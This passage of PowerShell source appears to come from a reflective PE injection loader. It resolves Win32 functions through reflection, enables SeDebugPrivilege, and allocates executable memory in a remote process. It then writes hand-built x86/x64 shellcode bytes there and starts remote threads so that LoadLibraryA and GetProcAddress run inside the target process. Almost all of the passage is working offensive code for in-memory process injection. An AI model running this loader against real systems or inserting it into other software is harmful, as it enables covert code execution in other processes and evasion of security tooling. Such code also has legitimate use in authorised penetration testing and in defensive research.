        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	

			
	
	
	

	
	
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw ""Cannot subtract bytearrays of different sizes""
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw ""Cannot add bytearrays of different sizes""
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw ""Cannot compare byte arrays of different size""
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value 
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = ""0x{0:X$($ValueSize)}"" -f [Int64]$Value 

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = ""Size"", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw ""Trying to write to memory smaller than allocated address range. $DebugString""
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw ""Trying to write to memory greater than allocated address range. $DebugString""
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw ""Unable to get the handle to the current thread""
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw ""Unable to impersonate self""
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw ""Unable to OpenThreadToken.""
				}
			}
			else
			{
				Throw ""Unable to OpenThreadToken. Error code: $ErrorCode""
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, ""SeDebugPrivilege"", $PLuid)
		if ($Result -eq $false)
		{
			Throw ""Unable to call LookupPrivilegeValue""
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw ""Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError""
			}
		}
		
		else
		{
			
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error ""Error creating remote thread, thread handle is null"" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw ""Invalid IMAGE_NT_HEADER signature.""
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	
	
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw ""PE file is not an EXE or DLL""
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw ""Unable to allocate memory in the remote process""
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw ""Unable to write DLL path to remote process memory""
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw ""Didn't write the expected amount of bytes when writing a DLL path to load to the remote process""
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""LoadLibraryA"") 
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw ""Unable to allocate memory in the remote process for the return value of LoadLibraryA""
			}
			
			
			
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw ""Unable to allocate memory in the remote process for shellcode""
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw ""Unable to write shellcode to remote process memory.""
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
			}
			
			
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw ""Call to ReadProcessMemory failed""
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw ""Call to GetExitCodeThread failed""
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   
        
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw ""Unable to allocate memory in the remote process""
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw ""Unable to write DLL path to remote process memory""
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw ""Didn't write the expected amount of bytes when writing a DLL path to load to the remote process""
		    }
        }
        
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""GetProcAddress"") 

		
		
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw ""Unable to allocate memory in the remote process for the return value of GetProcAddress""
		}
		
		
		
		
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
